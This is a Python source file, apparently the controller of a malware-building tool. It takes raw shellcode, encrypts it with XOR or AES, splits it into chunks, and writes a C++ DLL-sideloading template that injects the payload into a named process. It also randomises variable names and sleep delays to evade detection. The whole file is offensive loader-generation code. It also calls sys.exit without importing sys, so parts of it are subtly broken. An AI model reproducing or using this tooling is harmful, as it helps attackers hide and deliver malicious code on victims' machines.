import random
import os

from Dll_Names.Dlls import dll_names
from Encryption.Xor import DoXor,key,key_hex
from Templates.Split_Xor_Shellcode import split_xor_shellcode
from Templates.C_Template import template
from Templates.Arguments  import parse_arguments
from Encryption.AES import encryptAES,keyAES

def Controller():

    #DLL_EXPORTS FOLDER PATH
    folder_path="./Dll_Exports/"

    array_dll_names=dll_names()

    # read the shellcode from the file and then encrypt it
    # Also output folder will be specified & the name of the process which will be injected
    args = parse_arguments()
    try:
        plaintext = open(args.raw[0],"rb").read()
        output_folder = args.path[0]
        process_to_inject = args.pname
        file_alias = args.dexports[0]
        if file_alias not in array_dll_names:
            print(f"Invalid file option. Available options: {', '.join(array_dll_names.keys())}\n")
            sys.exit(1)
        file_option = array_dll_names[file_alias]
        encryption_type =  args.enc[0]
        injection = args.inj[0]
        shellcode_var =args.rshell[0]
        xor_func = args.rxor[0]
        key_var = args.rkey[0]
        time = args.rsleep
    except:
        parse_arguments()
        sys.exit()

    with open(os.path.join(folder_path, file_option), "r") as f:
        # Read the contents of the file
        file_contents = f.read()


    if encryption_type == "XOR":
        ciphertext = DoXor(plaintext, key)
        ciphertext_split = split_xor_shellcode(ciphertext)
        c_template=template(file_contents,xor_func,shellcode_var,ciphertext_split,key_var,key_hex,process_to_inject,time,injection,encryption_type)

    elif encryption_type == "AES":
        ciphertext = encryptAES(plaintext,keyAES)
        ciphertext_split = split_xor_shellcode(ciphertext)
        c_template=template(file_contents,xor_func,shellcode_var,ciphertext_split,key_var,keyAES,process_to_inject,time,injection,encryption_type)

    # Create the output folder if it doesn't exist
    if not os.path.exists(output_folder):
        os.makedirs(output_folder)

    # Generate output file path
    output_filename = os.path.join(output_folder, "main.cpp")

    # Write encoded shellcode to output file
    with open(output_filename, "w") as f:
        f.write(c_template)
    print("Create a new visual studio project and copy the files located at " + output_folder + " Folder \n")
    print("DLL SIDELOADING Template has been saved to: " + output_filename)